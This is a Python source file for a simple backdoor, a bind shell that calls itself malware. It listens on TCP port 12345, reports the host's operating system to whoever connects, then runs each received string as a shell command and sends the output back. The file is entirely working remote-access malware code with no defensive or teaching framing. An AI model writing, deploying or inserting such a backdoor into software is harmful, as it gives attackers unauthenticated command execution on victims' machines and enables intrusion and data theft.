import socket
from subprocess import Popen, PIPE
import platform
import os


class Shell:
    command = ""
    next_command = True

    def __init__(self, malware_os):
        self._os = malware_os
        self._response = ""

    def receive(self):
        self.command = distant_socket.recv(4096).decode("utf-8")

    def execute_command(self):
        self.result = None
        if self.command[:2] == "cd":
            path = self.command[3:]
            if os.path.isdir(path):
                os.chdir(path)
                if self._os == "Windows":
                    self.result = Popen("cd", shell=True, stdout=PIPE)
                else:
                    self.result = Popen("pwd", shell=True, stdout=PIPE)
            else:
                self._response = (str("[!] This directory does not exist").encode("utf-8"))
        else:
            self.result = Popen(self.command, shell=True, stdout=PIPE)
        if self.result != None:
            self._response = self.result.communicate()

    def send(self):
        self._response = self._response[0]
        self._response = self._response.decode("utf-8", errors="ignore")
        self._response = self._response + " "
        self._response = self._response.encode("utf-8")
        distant_socket.send(self._response)
        self._response = None


def run_commands(malware_os, message):
    shell = Shell(malware_os)
    while message != "exit":
        while shell.next_command:
            if shell.command == "exit":
                shell.next_command = False
            else:
                shell.receive()
                shell.execute_command()
                shell.send()


def connection():
    global distant_socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = socket.gethostname()
    host_ip = socket.gethostbyname(host)
    s.bind((host_ip, 12345))
    s.listen(5)
    distant_socket, addr = s.accept()
    distant_socket.send("Welcome".encode("utf-8"))
    return s


def main():
    global distant_socket
    s = connection()
    message = distant_socket.recv(4096).decode("utf-8", errors="ignore")
    malware_os = platform.system()
    while message != "os":
        message = distant_socket.recv(4096).decode("utf-8", errors="ignore")
    distant_socket.send(platform.system().encode("utf-8"))
    run_commands(malware_os, message)
    s.close()


if __name__ == "__main__":
    main()
